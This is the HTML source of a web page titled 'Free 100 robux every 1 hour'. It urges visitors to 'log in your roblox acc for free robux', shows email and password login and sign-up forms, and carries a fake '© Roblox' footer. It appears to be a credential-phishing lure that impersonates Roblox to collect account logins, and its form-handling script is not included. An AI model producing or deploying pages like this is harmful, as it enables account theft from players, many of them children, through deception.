<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Free 100 robux every 1 hour</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <h1>Log in your roblox acc for free robux</h1>
        <nav>
            <ul>
                <li><a href="#login">Login</a></li>
                <li><a href="#forgot password">Sign Up</a></li>
            </ul>
        </nav>
    </header>
    <main>
        <section id="login">
            <h2>Login</h2>
            <form id="loginForm">
                <label for="loginEmail">Email:</label>
                <input type="email" id="loginEmail" required>
                <label for="loginPassword">Password: 
                </label>
                <input type="password" id="loginPassword" required>
                <button type="submit">Login</button>
            </form>
        </section>
        <section id="signup">
            <h2>Sign Up</h2>
            <form id="signupForm">
                <label for="signupName">Name:</label>
                <input type="text" id="signupName" required>
                <label for="signupEmail">Email:</label>
                <input type="email" id="signupEmail" required>
                <label for="signupPassword">Password:</label>
                <input type="password" id="signupPassword" required>
                <button type="submit">Sign Up</button>
            </form>
        </section>
        <section id="feed">
            <h2>User Feed</h2>
            <div id="posts">
                <!-- User posts will appear here -->
            </div>
            <form id="postForm">
                <label for="postContent">New Post:</label>
                <textarea id="postContent" required></textarea>
                <button type="submit">Post</button>
            </form>
        </section>
    </main>
    <footer>
        <p>&copy; Roblox</p>
    </footer>
    <script src="scripts.js"></script>
</body>
</html>
